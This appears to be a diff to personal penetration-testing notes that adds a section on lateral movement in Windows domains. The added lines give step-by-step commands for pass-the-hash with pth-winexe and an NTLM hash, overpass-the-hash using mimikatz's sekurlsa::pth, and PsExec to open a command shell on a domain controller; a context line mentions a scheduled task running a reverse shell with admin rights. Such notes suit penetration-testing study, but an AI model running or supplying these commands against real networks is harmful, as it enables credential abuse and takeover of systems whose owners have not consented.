@@ -119,7 +119,28 @@
 	
     b. Powershell schedule task to run rev shell with admin priv?
 
-  #Lateral Movements #
+  # Lateral Movements #
 
- 
+ 1. Pass the Hash - You have NTLM creds
+	On Kali -> pth-winexe -U bob%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
+eb3b9f05c425e //$ip cmd
+
+2. Over Pass the Hash
+	a. Right click a program like notepad and "run as different user"
+	
+	b. After authneticated that users NTLM hash has now been stored
+	
+	c. run mimikatz with admin priv 
+	
+	d. sekurlsa::pth /user:bob /domain:controller.local /ntlm:e2b475c11da2a0748290d
+87aa966c327 /run:Powershell.exe
+	
+	e. net use //dc3  (generate TGT)
+	
+	f. .\PsExec.exe \\dc3 cmd.exe  (you are now on the dc machine)
+
+	
+DCOM
+	
+	
 
